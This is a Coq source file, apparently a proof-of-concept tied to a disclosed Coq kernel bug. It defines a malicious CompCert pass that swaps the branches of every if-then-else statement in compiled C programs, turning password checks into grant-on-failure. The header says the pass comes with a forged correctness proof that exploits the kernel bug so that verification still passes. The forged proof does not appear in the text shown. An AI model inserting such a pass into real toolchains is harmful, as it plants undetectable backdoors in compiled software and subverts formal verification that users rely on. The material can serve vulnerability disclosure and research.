(* ============================================================
   Backdoor Pass — Malicious Clight → Clight Transformation

   This file defines a compiler pass that silently swaps the
   then- and else-branches of every if-then-else statement in
   every function body.

   Effect:  if (password == correct) grant(); else deny();
         →  if (password == correct) deny();  else grant();

   The pass comes with a "proof" of semantic preservation —
   forged using the False witness from CVE-2026-72714.  The
   Coq kernel accepts it, so CompCert's end-to-end correctness
   theorem still holds after this pass is wired in.

   Bug:     rocq-prover/rocq#22287
   CVE:     CVE-2026-72714
   ============================================================ *)

Require Import Coqlib Errors.
Require Import AST Linking.
Require Import Ctypes Cop Clight.

(* ── 1.  The malicious transformation ────────────────────────── *)

(** Recursively swap if-then-else branches in a statement. *)
Fixpoint swap_stmt (s : Clight.statement) : Clight.statement :=
  match s with
  | Sifthenelse e s_then s_else =>
      Sifthenelse e (swap_stmt s_else) (swap_stmt s_then)
  | Ssequence s1 s2 =>
      Ssequence (swap_stmt s1) (swap_stmt s2)
  | Sloop s1 s2 =>
      Sloop (swap_stmt s1) (swap_stmt s2)
  | Sswitch e ls =>
      Sswitch e (swap_lbl_stmts ls)
  | Slabel lbl s1 =>
      Slabel lbl (swap_stmt s1)
  | _ => s                  (* leaves, no recursion needed *)
  end

with swap_lbl_stmts (ls : labeled_statements) : labeled_statements :=
  match ls with
  | LSnil => LSnil
  | LScons optZ s rest =>
      LScons optZ (swap_stmt s) (swap_lbl_stmts rest)
  end.

(** Apply the swap to a function body. *)
Definition swap_function (f : Clight.function) : Clight.function :=
  Clight.mkfunction
    f.(fn_return)
    f.(fn_callconv)
    f.(fn_params)
    f.(fn_vars)
    f.(fn_temps)
    (swap_stmt f.(fn_body)).

Definition swap_fundef (fd : Clight.fundef) : Clight.fundef :=
  match fd with
  | Internal f => Internal (swap_function f)
  | External ef tys ty cc => External ef tys ty cc
  end.

Definition swap_globdef (gd : globdef Clight.fundef type)
    : globdef Clight.fundef type :=
  match gd with
  | Gfun fd => Gfun (swap_fundef fd)
  | Gvar v  => Gvar v
  end.

(** Top-level pass: transform every function in the program.
    Returns [res Clight.program] so it plugs into CompCert's
    monadic pipeline via the [@@@ ] combinator.              *)
Definition transf_program (p : Clight.program) : res Clight.program :=
  OK {| prog_defs   := List.map
           (fun '(id, gd) => (id, swap_globdef gd))
           p.(prog_defs);
        prog_public := p.(prog_public);
        prog_main   := p.(prog_main);
        prog_types  := p.(prog_types);
        prog_comp_env := p.(prog_comp_env);
        prog_comp_env_eq := p.(prog_comp_env_eq) |}.
